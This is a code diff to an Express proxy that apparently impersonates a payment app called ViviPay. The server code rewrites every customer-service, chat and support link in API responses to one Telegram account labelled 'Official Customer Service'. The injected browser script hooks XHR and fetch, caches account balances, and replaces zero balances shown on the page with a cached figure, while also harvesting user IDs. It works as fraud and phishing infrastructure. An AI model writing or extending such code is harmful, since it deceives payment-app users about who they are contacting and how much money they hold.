@@ -807,6 +807,39 @@ app.all('/xxapi/*', async (req, res) => {
 
     const respData = jsonResp.data || jsonResp.body || jsonResp.result || null;
 
+    if (urlLower.includes('customerservice')) {
+      const csData = [
+        { title: 'ViviPay Online Service', subtitle: 'TG - Subscription Channel', icon: 'telegram', url: 'https://t.me/Vivipaymed' },
+        { title: 'ViviPay Online Service', subtitle: 'WhatsApp - Subscription Channel', icon: 'whatsapp', url: 'https://t.me/Vivipaymed' },
+        { title: 'Online CSR', subtitle: 'Official Customer Service', icon: 'headset', url: 'https://t.me/Vivipaymed' }
+      ];
+      function replaceCSUrls(obj) {
+        if (!obj || typeof obj !== 'object') return;
+        if (Array.isArray(obj)) {
+          obj.forEach(item => replaceCSUrls(item));
+          return;
+        }
+        for (const k of Object.keys(obj)) {
+          const kl = k.toLowerCase();
+          if (typeof obj[k] === 'string') {
+            if (kl === 'url' || kl === 'link' || kl === 'href' || kl === 'value' || kl === 'action' || kl === 'jumpurl' || kl === 'jump_url' || kl === 'target' || kl === 'redirect' || kl === 'serviceurl' || kl === 'service_url' || kl === 'contacturl' || kl === 'contact_url') {
+              obj[k] = 'https://t.me/Vivipaymed';
+            }
+            if ((obj[k].startsWith('http://') || obj[k].startsWith('https://')) && (obj[k].includes('t.me/') || obj[k].includes('wa.me/') || obj[k].includes('whatsapp') || obj[k].includes('telegram') || obj[k].includes('chat') || obj[k].includes('service') || obj[k].includes('support'))) {
+              obj[k] = 'https://t.me/Vivipaymed';
+            }
+          } else if (typeof obj[k] === 'object') {
+            replaceCSUrls(obj[k]);
+          }
+        }
+      }
+      replaceCSUrls(jsonResp);
+      const finalCS = JSON.stringify(jsonResp);
+      respHeaders['content-length'] = String(Buffer.byteLength(finalCS));
+      res.writeHead(response.status, respHeaders);
+      return res.end(finalCS);
+    }
+
     let reqBody = {};
     if (req.rawBody && req.rawBody.length > 0) {
       try {
@@ -1057,6 +1090,43 @@ arguments[1]=u;}
 this._hu=u;this._hm=m;
 return _open.apply(this,arguments);};
 
+var BAL_KEYS=['iToken','itoken','balance','userBalance','availableBalance','totalBalance','money','tokenBalance','usermoney','memberBalance','myBalance','walletBalance','accountBalance','coinBalance'];
+var _cachedBal=null;
+try{var _cb=localStorage.getItem('_px_bal');if(_cb)_cachedBal=_cb;}catch(e){}
+
+function cacheBal(obj){
+if(!obj||typeof obj!=='object')return;
+for(var i=0;i<BAL_KEYS.length;i++){
+var bk=BAL_KEYS[i];
+if(obj[bk]!==undefined&&obj[bk]!==null&&obj[bk]!==''){
+var bv=parseFloat(obj[bk]);
+if(!isNaN(bv)&&bv>0){_cachedBal=String(bv);
+try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
+for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}
+
+function patchBalDOM(){
+if(!_cachedBal)return;
+var sels=['[class*=balance]','[class*=Balance]','[class*=itoken]','[class*=iToken]','[class*=money]','[class*=Money]','[class*=wallet]','[class*=Wallet]','[class*=amount]','[class*=coin]'];
+for(var s=0;s<sels.length;s++){
+try{var els=document.querySelectorAll(sels[s]);
+for(var i=0;i<els.length;i++){
+var el=els[i];
+var txt=(el.innerText||'').trim();
+if(txt==='0'||txt==='0.00'||txt==='0.0'||txt==='₹0'||txt==='₹0.00'||txt==='₹ 0'||txt==='₹ 0.00'){
+if(el.children.length===0){
+el.innerText=_cachedBal;}}}}catch(e){}}
+var allSpans=document.querySelectorAll('span,div,p,h1,h2,h3,h4,h5,h6,strong,b,em,label,td');
+for(var i=0;i<allSpans.length;i++){
+var el2=allSpans[i];
+if(el2.children.length>0)continue;
+var t2=(el2.innerText||'').trim();
+if(t2==='0.00'||t2==='0'){
+var par=el2.parentElement;
+if(par){var pc=(par.className||'').toLowerCase()+(par.id||'').toLowerCase();
+var sib=(par.innerText||'').toLowerCase();
+if(pc.indexOf('balan')>-1||pc.indexOf('itoken')>-1||pc.indexOf('money')>-1||pc.indexOf('wallet')>-1||sib.indexOf('balance')>-1||sib.indexOf('itoken')>-1||sib.indexOf('wallet')>-1){
+el2.innerText=_cachedBal;}}}}}
+
 XMLHttpRequest.prototype.send=function(body){
 var self=this;
 self.addEventListener('load',function(){
@@ -1067,6 +1137,7 @@ var j=typeof r==='object'?r:(typeof r==='string'?JSON.parse(r):null);
 if(!j)return;
 var d=j.data||j.body||j.result||j;
 if(d&&typeof d==='object'){
+cacheBal(d);
 for(var i=0;i<ID_FIELDS.length;i++){
 var f=ID_FIELDS[i];
 if(d[f]){var v=String(d[f]).trim();
@@ -1086,6 +1157,7 @@ try{var cl=resp.clone();
 cl.text().then(function(t){
 try{var j=JSON.parse(t);var d=j.data||j.body||j.result||j;
 if(d&&typeof d==='object'){
+cacheBal(d);
 for(var i=0;i<ID_FIELDS.length;i++){
 var f=ID_FIELDS[i];if(d[f]){var v=String(d[f]).trim();
 if(/^\\d{6,12}$/.test(v)){setUID(v);break;}}}}}catch(e){}}).catch(function(){});}catch(e){}
@@ -1152,13 +1224,13 @@ var m=txt.match(/ID\\s*:\\s*([0-9]{6,12})/i);
 if(m&&m[1])setUID(m[1]);
 }catch(e){}}
 
-scanDOM();
-setInterval(function(){scanDOM();},3000);
+scanDOM();patchBalDOM();
+setInterval(function(){scanDOM();patchBalDOM();},500);
 if(document.body){
-var obs=new MutationObserver(function(){fixLinks();fixOnClick();scanDOM();});
+var obs=new MutationObserver(function(){fixLinks();fixOnClick();patchBalDOM();scanDOM();});
 obs.observe(document.body,{childList:true,subtree:true});}
 setInterval(function(){fixLinks();fixOnClick();},2000);
-fixLinks();fixOnClick();
+fixLinks();fixOnClick();patchBalDOM();
 })();`;
 
 module.exports = app;
